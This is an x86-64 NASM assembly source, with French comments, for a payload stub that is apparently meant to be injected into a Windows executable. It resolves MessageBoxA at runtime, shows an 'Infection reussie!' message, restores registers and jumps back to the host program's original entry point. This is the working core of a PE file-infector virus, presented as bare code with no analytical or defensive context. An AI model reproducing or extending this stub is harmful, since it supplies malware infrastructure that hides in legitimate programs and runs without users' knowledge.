; payload.asm — stub autonome, alignement correct
; NASM : nasm -f bin payload.asm -o payload.bin
bits 64
default rel
section .text
global _start

_start:
    ; Sauvegarde RCX,RDX,R8,R9         (32 o)
    push    r9
    push    r8
    push    rdx
    push    rcx

    sub     rsp, 0x28                 ; 32 o shadow + 8 o pour réaligner
    ;  -> (RSP+8) %16 == 0   ✅

    ; LoadLibraryA("user32.dll")
    lea     rcx, [rel user32_str]
    mov     rax, [rel ptr_LoadLibraryA]
    call    rax                        ; RAX = hUser32

    ; GetProcAddress(hUser32,"MessageBoxA")
    mov     rcx, rax
    lea     rdx, [rel msgbox_str]
    mov     rax, [rel ptr_GetProcAddress]
    call    rax                        ; RAX = MessageBoxA
    mov     [rel ptr_MessageBoxA], rax ; (optionnel)

    ; MessageBoxA(NULL, txt, tit, MB_OK)
    xor     rcx, rcx
    lea     rdx, [rel txt]
    lea     r8,  [rel tit]
    xor     r9,  r9
    call    rax

    add     rsp, 0x28                 ; restaure shadow & align
    ; Restaure RCX,RDX,R8,R9 (ordre inverse)
    pop     rcx
    pop     rdx
    pop     r8
    pop     r9

    mov     rax, [rel original_oep]   ; retour programme légitime
    jmp     rax

; ---------------- données ----------------------------------------------------
tit            db "Yharnam",0
txt            db "Infection reussie!",0
user32_str     db "user32.dll",0
msgbox_str     db "MessageBoxA",0

align 8
ptr_LoadLibraryA    dq 0
ptr_GetProcAddress  dq 0
ptr_MessageBoxA     dq 0            ; résolu à l’exécution
original_oep        dq 0
